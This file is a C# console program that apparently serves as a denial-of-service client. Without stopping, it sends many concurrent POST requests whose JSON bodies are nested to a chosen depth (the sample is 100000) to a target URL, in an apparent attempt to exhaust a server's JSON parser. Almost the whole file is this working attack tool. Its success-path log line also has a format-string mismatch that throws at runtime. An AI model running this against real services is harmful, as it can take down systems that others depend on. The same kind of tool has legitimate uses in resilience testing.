using System.Diagnostics;
using System.Text;

namespace Client;

public class Program
{
    private static int activeConnections;

    public static async Task Main(string[] args)
    {
        // Example usage:
        // dotnet run 10 200 100000 https://www.example.org

        var delayBetweenRequests = TimeSpan.FromMilliseconds(int.Parse(args[0]));
        var maxActiveConnections = int.Parse(args[1]);
        var payload = GeneratePayload(int.Parse(args[2]));
        var url = args[3];

        using var timer = new PeriodicTimer(delayBetweenRequests);
        using var semaphore = new SemaphoreSlim(maxActiveConnections);

        while (await timer.WaitForNextTickAsync())
        {
            await semaphore.WaitAsync();

            _ = Task.Run(async () =>
            {
                try
                {
                    await SendRequest(url, payload);
                }
                finally
                {
                    semaphore.Release();
                }
            });
        }
    }

    private static async Task SendRequest(string url, string payload)
    {
        Interlocked.Increment(ref activeConnections);

        using var client = new HttpClient();
        var stopwatch = Stopwatch.StartNew();

        try
        {
            using var content = new StringContent(payload);
            using var response = await client.PostAsync(url, content);

            Console.WriteLine("{0} {1} {2} {3} ({4} active connections)",
                stopwatch.Elapsed, response.StatusCode, response.ReasonPhrase, activeConnections);
        }
        catch (Exception ex)
        {
            Console.WriteLine("{0} {1} {2} ({3} active connections)",
                stopwatch.Elapsed, ex.GetType().Name, ex.Message, activeConnections);
        }
        finally
        {
            Interlocked.Decrement(ref activeConnections);
        }
    }

    private static string GeneratePayload(int depth)
    {
        var sb = new StringBuilder();

        for (int i = 0; i < depth; ++i)
        {
            sb.Append("{\"A\":");
        }

        sb.Append("{}");

        for (int i = 0; i < depth; ++i)
        {
            sb.Append('}');
        }

        return sb.ToString();
    }
}
